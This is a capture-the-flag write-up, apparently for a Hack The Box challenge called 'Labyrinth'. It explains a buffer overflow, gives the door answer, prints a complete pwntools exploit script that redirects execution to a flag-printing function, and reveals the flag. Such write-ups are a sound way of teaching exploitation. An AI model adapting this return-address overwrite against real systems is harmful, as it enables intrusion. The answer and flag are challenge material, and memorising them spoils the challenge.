# Labyrinth

The binary of this challenge is vulnerable to a buffer overflow  caused by a `fgets()` call. Before reaching the exploitation point the binary asks us to choose the correct door between 100 of them. The answer (69) can be found by statically analyzing the binary using tools like Ghidra or IDA. After this, it's just a matter of finding the correct offset to overwrite the return address with the address of `escape_plan()`, the function which prints out the flag. A small caveat here is that jumping right at the address of the mentioned function won't work because of memory alignment reasons. We can overcome this issue by jumping at the instruction immediately after. The final exploit code looks like:

```python
from pwn import *
import time

targetIP = '178.62.64.13'
targetPort = 30584

if 'REMOTE' not in args:
    r = process('./labyrinth')
else:
    r = remote(targetIP, targetPort)

elf = ELF('./labyrinth')

rip = p64(0x00401256)
print(hex(u64(rip)))
print(r.recvuntil('>> ').decode())
r.sendline('69')
print(r.recvuntil('>> ').decode())
time.sleep(0.1)
r.sendlineafter('>> ', rip * 8)
print(r.recvrepeat(2000).decode())
```

## HTB{3sc4p3_fr0m_4b0v3}
